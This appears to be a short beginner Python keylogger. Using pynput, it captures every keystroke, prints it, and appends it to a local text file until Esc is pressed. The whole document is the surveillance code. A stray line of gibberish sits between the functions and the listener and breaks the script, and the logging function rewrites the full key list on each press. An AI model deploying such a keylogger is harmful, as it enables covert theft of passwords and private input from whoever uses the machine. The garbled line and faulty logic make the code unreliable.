from pynput.keyboard import Key, Listener  # import the 2 functions

"""The keylogger basically have 3 main Think
1. know which key is pressed 
2. release key ---
3. data to be store of pressed key"""

# creating a file to store keystroke
k = []

def on_press(key):
    k.append(key)
    write_1(k)
    print(key)

def write_1(var):
    # file handling
    with open("demo.txt ", "a") as f:  # f is a file pointer
        for i in var:
            new_var = str(i).replace("'", '')
            f.write(new_var)
            f.write(" ")

def on_release(key):
    if key == Key.esc:
        return False
stwelcome to karachi salskpifdipjsdigjsdifbjsdfidbjdfbdbfghfghfghf major

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()